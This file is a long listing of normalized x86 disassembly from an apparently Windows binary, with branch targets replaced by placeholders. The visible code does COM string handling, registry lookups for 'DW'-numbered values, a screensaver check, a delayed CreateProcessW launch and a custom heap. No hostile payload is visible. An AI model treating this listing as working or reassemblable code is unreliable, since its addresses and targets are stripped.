je r-xdata
push [ esi + 0x10 ]
call edi
test eax eax
mov [ ebx + 0x10 ] eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x14 ]
call [ StringFromIID@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x4 ]
call edi
test eax eax
mov [ ebx + 0x14 ] eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ ebx + 0x18 ] eax
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
test eax eax
mov [ ebx + 0x20 ] eax
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
push eax
call edi
test eax eax
mov [ ebx + 0x2c ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x30 ]
call [ StringFromIID@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x4 ]
call edi
test eax eax
mov [ ebx + 0x30 ] eax
jne r-xdata
mov [ ebp + 0x8 ] 0x8007000e
sub_30002b15
push ebp
mov ebp esp
sub esp 0x34
and [ ebp - 0x34 ] 0x0
push edi
push 0xc
pop ecx
xor eax eax
lea edi [ ebp - 0x30 ]
[ edi ]
push r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_30002981
test eax eax
pop edi
jl r-xdata
leave
retn 0x8
mov eax [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x34 ]
push eax
call sub_300026a1
lea eax [ ebp - 0x34 ]
push eax
call sub_30002906
sub_30002b5c
push ebx
mov ebx [ esp + 0xc ]
push edi
xor edi edi
cmp ebx edi
jbe r-xdata
pop edi
pop ebx
retn 0x8
push esi
mov esi [ esp + 0x10 ]
add esi 0x4
mov [ esi - 0x4 ] edi
mov [ esi + 0x4 ] edi
add esi 0x18
dec ebx
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
je r-xdata
cmp [ esi - 0x4 ] edi
je r-xdata
pop esi
mov [ esi ] edi
dec eax
je r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
dec eax
je r-xdata
push eax
call sub_300047d9
dec eax
jne r-xdata
sub_30002ba5
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x18 ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
pop esi
pop ebx
leave
retn 0x14
push 0x106
push [ ebp - 0x4 ]
call sub_300048c4
cmp eax ebx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
lea eax [ ebp - 0x4 ]
push eax
push [ ecx ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp ecx [ edi ]
sete al
xor eax eax
jmp r-xdata
pop edi
sub_30002c35
mov ecx [ esp + 0x4 ]
test ecx ecx
mov edx [ esp + 0x8 ]
je r-xdata
xor eax eax
cmp ecx edx
setne al
test edx edx
jne r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al [ edx ]
jne r-xdata
mov al [ edx ]
neg al
sbb eax eax
jmp r-xdata
movsx eax [ ecx ]
movsx ecx [ edx ]
sub eax ecx
jmp r-xdata
inc ecx
inc edx
retn 0x8
sub_30002c6d
push esi
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
test ecx ecx
mov edx [ esp + 0xc ]
je r-xdata
pop esi
retn 0xc
xor eax eax
cmp ecx edx
setne al
test edx edx
jne r-xdata
mov al [ ecx ]
test al al
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp al [ edx ]
jne r-xdata
cmp [ edx ] al
je r-xdata
movsx eax [ ecx ]
movsx ecx [ edx ]
sub eax ecx
jmp r-xdata
inc ecx
inc edx
dec esi
or eax 0xffffffff
jmp r-xdata
sub_30002cbd
cmp [ esp + 0x8 ] 0x7fffffff
jbe r-xdata
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax 0x80070057
retn 0xc
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
mov eax 0x80070057
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
pop esi
jne r-xdata
mov [ edx ] cx
inc edx
inc edx
inc esi
inc esi
dec [ ebp + 0xc ]
jne r-xdata
pop ebp
retn 0xc
and [ edx ] 0x0
dec edx
dec edx
mov eax 0x8007007a
mov cx [ esi ]
test cx cx
je r-xdata
sub_30002cd3
push ebp
lea ebp [ esp - 0x1b8 ]
sub esp 0x238
mov eax [ rw-data ]
push ebx
push esi
push edi
xor esi esi
mov [ ebp + 0x1b4 ] eax
xor eax eax
mov [ ebp - 0x54 ] si
mov ecx 0x81
lea edi [ ebp - 0x52 ]
[ edi ]
mov ecx [ ebp + 0x1c4 ]
add ecx ecx
mov edx ecx
stosw [ edi ]
mov edi [ ebp + 0x1c0 ]
shr ecx 0x2
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
lea eax [ ebp - 0x60 ]
push eax
push 0x20019
push esi
push r-xdata
push 0x80000002
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x7c ] esi
xor ebx ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x80 ] esi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x60 ] esi
je r-xdata
push esi
push esi
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x60 ]
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x58 ] esi
mov edi [ GlobalFree@IAT ]
je r-xdata
push [ ebp - 0x60 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x70 ]
mov edi [ GlobalAlloc@IAT ]
inc [ ebp - 0x5c ]
push 0x40
call edi
cmp eax esi
mov [ ebp - 0x58 ] eax
je r-xdata
cmp ebx esi
je r-xdata
push [ ebp - 0x58 ]
call edi
mov eax [ ebp - 0x5c ]
add eax eax
push eax
push 0x40
call edi
mov ebx eax
cmp ebx esi
je r-xdata
mov ecx [ ebp + 0x1b4 ]
mov eax [ ebp - 0x7c ]
pop edi
pop esi
pop ebx
call sub_3000607d
add ebp 0x1b8
leave
retn 0xc
push ebx
call edi
cmp [ ebp - 0x6c ] esi
mov [ ebp - 0x64 ] esi
jbe r-xdata
mov edi [ ebp + 0x1c8 ]
cmp edi esi
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x74 ] eax
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x58 ]
lea eax [ ebp - 0x78 ]
push eax
push esi
lea eax [ ebp - 0x68 ]
push eax
push ebx
push [ ebp - 0x64 ]
push [ ebp - 0x60 ]
call [ RegEnumValueW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x7c ] 0x1
push 0x104
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ edi ] esi
call [ GetModuleFileNameW@IAT ]
test eax eax
je r-xdata
inc [ ebp - 0x64 ]
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x6c ]
jb r-xdata
cmp [ ebp - 0x78 ] 0x1
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
push [ ebp + 0x1c0 ]
call sub_300024ca
mov [ edi ] eax
cmp [ ebp - 0x68 ] 0x6
jne r-xdata
cmp [ ebx ] 0x44
jne r-xdata
cmp [ ebx + 0x2 ] 0x57
jne r-xdata
mov ax [ ebx + 0x4 ]
push eax
call sub_30002592
test eax eax
je r-xdata
mov di [ ebx + 0x6 ]
push edi
call sub_30002592
test eax eax
je r-xdata
mov dx [ ebx + 0x8 ]
push edx
call sub_30002592
test eax eax
je r-xdata
mov cx [ ebx + 0xa ]
push ecx
call sub_30002592
test eax eax
je r-xdata
movzx eax [ ebx + 0x4 ]
sub eax 0x30
imul eax eax 0xa
movzx edi di
lea eax [ eax + edi - 0x30 ]
imul eax eax 0xa
movzx edx dx
lea eax [ eax + edx - 0x30 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
cmp eax [ ebp - 0x80 ]
jbe r-xdata
mov [ ebp - 0x80 ] eax
mov eax [ ebp + 0x1c4 ]
add eax eax
cmp [ ebp - 0x74 ] eax
jae r-xdata
push [ ebp - 0x58 ]
push [ ebp + 0x1c4 ]
push [ ebp + 0x1c0 ]
call sub_30002cbd
sub_30002f2a
push ebp
lea ebp [ esp - 0x5f4 ]
sub esp 0x674
mov eax [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0x600 ]
push edi
mov [ ebp + 0x5f0 ] eax
push 0x10
xor eax eax
pop ecx
mov [ ebp - 0x80 ] 0x44
lea edi [ ebp - 0x7c ]
[ edi ]
xor ebx ebx
mov [ ebp - 0x3c ] ebx
lea edi [ ebp - 0x38 ]
stosd [ edi ]
stosd [ edi ]
neg esi
sbb esi esi
push r-xdata
stosd [ edi ]
and esi 0x3a980
call sub_300025ac
test eax eax
je r-xdata
xor eax eax
cmp esi ebx
jbe r-xdata
push ebx
push 0x104
lea eax [ ebp + 0x3e8 ]
push eax
call sub_30002cd3
test eax eax
je r-xdata
cmp [ ebp + 0x600 ] ebx
je r-xdata
push [ ebp + 0x5fc ]
lea eax [ ebp + 0x3e8 ]
push 0x71
push eax
push r-xdata
lea eax [ ebp - 0x28 ]
push 0x208
push eax
call [ wnsprintfW@IAT ]
add esp 0x18
push ebx
lea eax [ ebp - 0x2c ]
push eax
push ebx
push 0x72
call [ SystemParametersInfoW@IAT ]
test eax eax
je r-xdata
push esi
call [ Sleep@IAT ]
xor edi edi
inc edi
cmp [ ebp + 0x600 ] ebx
je r-xdata
cmp [ ebp - 0x2c ] ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push ebx
push ebx
push 0x4000020
push ebx
push ebx
push ebx
lea eax [ ebp - 0x28 ]
push eax
push ebx
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x50 ] 0x7
push [ ebp - 0x3c ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x38 ]
call esi
mov eax edi
jmp r-xdata
mov ecx [ ebp + 0x5f0 ]
pop edi
pop esi
pop ebx
call sub_3000607d
add ebp 0x5f4
leave
retn 0x8
sub_30003051
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
and [ ebp - 0x20c ] 0x0
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
mov ecx 0x81
lea edi [ ebp - 0x20a ]
[ edi ]
push 0x0
stosw [ edi ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
call sub_30002cd3
test eax eax
pop edi
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_3000607d
leave
retn 0x4
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20c ]
push eax
call sub_300025eb
sub_300030af
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ ebp + 0xc ]
shl esi 0x2
push esi
lea eax [ ebp - 0xc ]
push eax
call sub_30003643
test eax eax
je r-xdata
pop esi
leave
retn 0xc
mov ecx esi
mov edx ecx
push ebx
shr ecx 0x2
push edi
mov edi [ ebp - 0xc ]
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
xor ebx ebx
xor esi esi
cmp [ ebp + 0xc ] ebx
[ edi ]
mov [ ebp - 0x14 ] esi
jle r-xdata
push [ ebp - 0xc ]
call sub_30003741
pop edi
pop ebx
mov edi [ ebp + 0x8 ]
add edi 0x10
mov [ ebp - 0x10 ] edi
inc esi
add edi 0x18
cmp esi [ ebp + 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + esi * 4 ] ebx
jne r-xdata
cmp [ edi - 0x10 ] ebx
jne r-xdata
mov eax [ edi ]
cmp [ eax ] 0x0
jne r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0x20019
push ebx
push eax
push [ ebp + 0x10 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
jge r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
lea esi [ edi - 0x8 ]
cmp eax ebx
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edi [ ebp - 0x10 ]
add esi 0x18
cmp eax [ ebp + 0xc ]
jl r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
xor edi edi
inc edi
mov [ eax + ecx * 4 ] edi
cmp [ esi - 0x8 ] ebx
jne r-xdata
push eax
call [ RegCloseKey@IAT ]
push [ edi ]
push [ esi + 0x8 ]
call sub_30002c35
test eax eax
jne r-xdata
mov esi [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x4 ]
sub eax ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ esi - 0x4 ]
push eax
push ebx
push ebx
push [ esi + 0xc ]
mov [ ebp - 0x18 ] 0x4
push ecx
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
dec eax
je r-xdata
mov [ esi - 0x8 ] edi
jmp r-xdata
push edi
jmp r-xdata
dec eax
je r-xdata
push esi
lea eax [ esi - 0x4 ]
push eax
push [ esi + 0xc ]
push ecx
call sub_30002ba5
test eax eax
je r-xdata
push 0x3
dec eax
jne r-xdata
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push [ esi + 0xc ]
mov [ ebp + 0x8 ] ebx
push ecx
call sub_30002ba5
test eax eax
je r-xdata
push ebx
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
push 0x106
lea edi [ ebx + ebx ]
push edi
call sub_300048c4
test eax eax
mov [ esi - 0x4 ] eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov [ esi ] edi
mov [ esi - 0x8 ] 0x1
xor ebx ebx
push [ ebp + 0x8 ]
call sub_300047d9
sub_30003294
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov edi 0x80000001
mov esi 0x80000002
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x2c ] edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] esi
mov edx 0x80000000
mov ecx 0x80000005
mov eax 0x80000003
mov [ ebp - 0x24 ] esi
xor esi esi
cmp [ edi ] 0x0
mov ebx r-xdata
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x50 ] r-xdata
mov [ ebp - 0x48 ] r-xdata
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x40 ] r-xdata
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] r-xdata
mov [ ebp - 0x28 ] r-xdata
mov [ ebp - 0x20 ] r-xdata
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] r-xdata
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] r-xdata
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_300049be
push eax
push ebx
push edi
call sub_30002c6d
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
shl esi 0x3
mov eax [ ebp + esi - 0x58 ]
cmp [ eax ] 0x0
jne r-xdata
mov ebx [ ebp + esi * 8 - 0x50 ]
inc esi
cmp [ ebx ] 0x0
jne r-xdata
push eax
call sub_300049be
mov ecx [ ebp + 0x10 ]
add eax edi
mov [ ecx ] eax
mov eax [ ebp + esi - 0x54 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
sub_3000337b
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_30003294
test eax eax
je r-xdata
leave
retn 0xc
lea eax [ ebp + 0x8 ]
push eax
push 0x20019
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_300030af
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
sub_300033ca
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_30003294
test eax eax
je r-xdata
leave
retn 0xc
lea eax [ ebp + 0x8 ]
push eax
push 0x20019
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
add eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push esi
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
pop esi
cmp [ ebp - 0x10 ] 0x1
je r-xdata
and [ esi ] ax
sub_3000343f
push ebp
mov ebp esp
sub esp 0x404
cmp [ ebp + 0x8 ] 0x0
mov eax [ rw-data ]
push ebx
push esi
mov esi [ wnsprintfA@IAT ]
push edi
mov [ ebp - 0x4 ] eax
mov ebx r-xdata
mov edi 0x400
jne r-xdata
push r-xdata
push r-xdata
push ebx
lea eax [ ebp - 0x404 ]
push edi
push eax
call esi
add esp 0x14
push [ ebp + 0x10 ]
lea eax [ ebp - 0x404 ]
push [ ebp + 0xc ]
push eax
call sub_3000337b
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
push r-xdata
push r-xdata
push ebx
lea eax [ ebp - 0x404 ]
push edi
push eax
call esi
add esp 0x14
push [ ebp + 0x10 ]
lea eax [ ebp - 0x404 ]
push [ ebp + 0xc ]
push eax
call sub_3000337b
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
push r-xdata
push r-xdata
push ebx
lea eax [ ebp - 0x404 ]
push edi
push eax
call esi
add esp 0x14
push [ ebp + 0x10 ]
lea eax [ ebp - 0x404 ]
push [ ebp + 0xc ]
push eax
call sub_3000337b
mov eax [ ebp + 0x14 ]
test eax eax
pop edi
pop esi
pop ebx
je r-xdata
push r-xdata
push r-xdata
push ebx
lea eax [ ebp - 0x404 ]
push edi
push eax
call esi
add esp 0x14
push [ ebp + 0x10 ]
lea eax [ ebp - 0x404 ]
push [ ebp + 0xc ]
push eax
call sub_3000337b
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_300033ca
push [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_300033ca
mov ecx [ ebp - 0x4 ]
call sub_3000607d
leave
retn 0x14
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_300033ca
push [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_300033ca
sub_3000359c
push esi
push edi
push 0x0
push 0x0
push 0x2
mov esi rw-data
push esi
push [ esp + 0x1c ]
xor edi edi
inc edi
call sub_3000343f
cmp [ rw-data ] 0x0
je r-xdata
push 0x2
push esi
call sub_30002b5c
mov eax edi
pop edi
pop esi
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
xor edi edi
sub_300035d9
push ebp
mov ebp esp
push ecx
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
call sub_30002469
and [ ebp + 0x10 ] 0x7
mov ebx eax
je r-xdata
test bl 0x2
je r-xdata
and ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
push 0x0
call sub_3000359c
test eax eax
jne r-xdata
pop ebx
leave
retn 0xc
push [ ebp + 0x8 ]
push ebx
call sub_30002f2a
and ebx 0xfffffffd
jne r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
test [ ebp - 0x4 ] 0x2
je r-xdata
push 0x2
call sub_30003051
push 0x10000002
call sub_30003051
sub_30003643
mov ecx [ rw-data ]
mov eax [ esp + 0x4 ]
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
add edi 0x1
push ecx
and edi 0xfffffffe
mov [ eax ] 0x0
call TlsGetValue
mov ebp [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add edx edi
cmp edx eax
push ebx
jbe r-xdata
push 0x1
push 0x2000
push 0x10000
push 0x0
call ebp
mov esi eax
test esi esi
je r-xdata
mov eax [ esi ]
mov ecx [ esp + 0x14 ]
pop ebx
mov [ ecx ] eax
add eax edi
pop edi
mov [ esi ] eax
pop esi
mov eax 0x1
pop ebp
retn 0x8
mov ecx eax
sub ecx esi
lea ebx [ ecx + edi + 0xfff ]
and ebx 0xfffff000
cmp ebx 0x10000
jg r-xdata
push 0xe004000e
call [ SetLastError@IAT ]
pop edi
pop esi
xor eax eax
pop ebp
retn 0x8
push 0x4
push 0x1000
push 0x1000
push esi
call ebp
test eax eax
jne r-xdata
push 0xe004000e
call [ SetLastError@IAT ]
pop ebx
pop edi
pop esi
xor eax eax
pop ebp
retn 0x8
push 0x4
mov edx ebx
sub edx eax
push 0x1000
add edx esi
push edx
push eax
call ebp
test eax eax
je r-xdata
mov edx [ rw-data ]
push esi
push edx
call TlsSetValue
lea eax [ esi + 0x1000 ]
lea ecx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi ] ecx
push 0x8000
push eax
push esi
call [ VirtualFree@IAT ]
add ebx esi
mov [ esi + 0x4 ] ebx
sub_30003741
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push esi
call [ GetLastError@IAT ]
mov esi eax
mov eax [ rw-data ]
push eax
call TlsGetValue
test esi esi
mov [ eax ] edi
je r-xdata
pop esi
push esi
call [ SetLastError@IAT ]
sub_30003770
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
mov esi [ esp + 0x8 ]
mov eax [ esi * 4 + rw-data ]
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
push rw-data
mov [ esi * 4 + rw-data ] 0x0
call [ LeaveCriticalSection@IAT ]
pop esi
retn
sub_300037b9
mov eax [ ecx ]
push esi
mov esi [ edx ]
cmp eax esi
ja r-xdata
mov eax 0x1
pop esi
retn
mov edx [ edx + 0x4 ]
mov ecx [ ecx + 0x4 ]
and edx 0x7fffffff
and ecx 0x7fffffff
add edx esi
add ecx eax
cmp ecx edx
jb r-xdata
xor eax eax
pop esi
retn
sub_300037e7
mov ecx [ esp + 0x4 ]
movzx eax [ ecx ]
push ebp
push esi
add eax ecx
xor esi esi
cmp eax ecx
push edi
mov edi ecx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
mov ebp [ esp + 0x14 ]
cmp eax ebp
je r-xdata
movzx edx [ 0x0 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
retn
movzx eax [ eax ]
xor edx edx
add eax ecx
test esi esi
sete dl
mov esi edx
test esi esi
je r-xdata
cmp eax ecx
jne r-xdata
movzx edi [ edi ]
add edi ecx
cmp eax edi
jne r-xdata
sub_3000383c
mov ecx [ esp + 0x4 ]
movzx eax [ ecx ]
push ebx
push ebp
push esi
add eax ecx
xor esi esi
cmp eax ecx
push edi
mov edi ecx
mov ebp ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebx [ esp + 0x18 ]
cmp eax ebx
je r-xdata
movzx edx [ 0x0 ]
test edx edx
je r-xdata
mov ax [ ebx ]
mov [ edi ] ax
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edi eax
movzx eax [ eax ]
xor edx edx
add eax ecx
test esi esi
sete dl
mov esi edx
test esi esi
je r-xdata
cmp eax ecx
jne r-xdata
movzx ebp [ ebp ]
add ebp ecx
cmp eax ebp
jne r-xdata
sub_3000389f
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
movzx eax [ esi ]
add eax esi
push edi
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] eax
mov ax [ esi + 0x6 ]
cmp ax 0xfffe
je r-xdata
mov edx [ rw-data ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
movzx eax ax
cmp [ eax * 2 + rw-data ] 0x5
jne r-xdata
test dl 0x1
je r-xdata
movzx ecx [ 0x0 ]
test ecx ecx
je r-xdata
push eax
call sub_300051df
add esp 0x4
test eax eax
jne r-xdata
movzx ecx [ eax + 0x2 ]
cmp ecx [ esp + 0x1c ]
jge r-xdata
mov ecx eax
and cl 0x7
neg cl
mov ebx edx
sbb ecx ecx
add ecx 0x1
and ebx 0x2
xor ecx ebx
je r-xdata
mov eax [ esp + 0x10 ]
xor edi edi
cmp eax esi
mov ebp esi
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ esp + 0x18 ] eax
movzx eax [ eax ]
xor ecx ecx
add eax esi
test edi edi
sete cl
mov edi ecx
test edi edi
je r-xdata
cmp eax esi
jne r-xdata
movzx ebp [ ebp ]
add ebp esi
cmp eax ebp
jne r-xdata
sub_30003956
mov eax [ esp + 0x4 ]
mov ecx eax
shr ecx 0x10
jne r-xdata
and eax 0xffff0000
cmp [ rw-data ] 0x0
movzx ecx [ eax + 0x6 ]
jne r-xdata
xor eax eax
retn
retn
cmp ecx 0x4
jb r-xdata
xor edx edx
cmp ecx 0xffff
setne dl
sub edx 0x1
and eax edx
cmp ecx 0x4000
ja r-xdata
cmp [ ecx * 4 + rw-data ] eax
je r-xdata
sub_3000399d
mov eax [ esp + 0x4 ]
mov ecx eax
sub esp 0x8
shr ecx 0x10
je r-xdata
mov eax 0x2
add esp 0x8
retn
and eax 0xffff0000
cmp [ rw-data ] 0x0
movzx ecx [ eax + 0x6 ]
jne r-xdata
movzx ecx [ eax + 0x6 ]
cmp ecx 0xffff
jne r-xdata
cmp ecx 0x4
jb r-xdata
cmp ecx [ rw-data ]
jb r-xdata
mov ecx [ rw-data ]
push sub_300037ad
lea edx [ esp + 0x4 ]
push edx
push ecx
mov [ esp + 0xc ] eax
call sub_30005145
test eax eax
je r-xdata
cmp ecx 0xffff
jne r-xdata
cmp ecx 0x4000
ja r-xdata
cmp [ ecx * 4 + rw-data ] eax
jne r-xdata
xor eax eax
add esp 0x8
retn
mov eax [ eax + 0x4 ]
and eax 0x80000000
neg eax
sbb eax eax
and eax 0x1000
add eax 0x1002
add esp 0x8
retn
cmp [ ecx * 4 + rw-data ] eax
je r-xdata
movzx eax [ ecx * 2 + rw-data ]
add esp 0x8
retn
sub_30003a4f
test [ rw-data ] 0x1
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
jne r-xdata
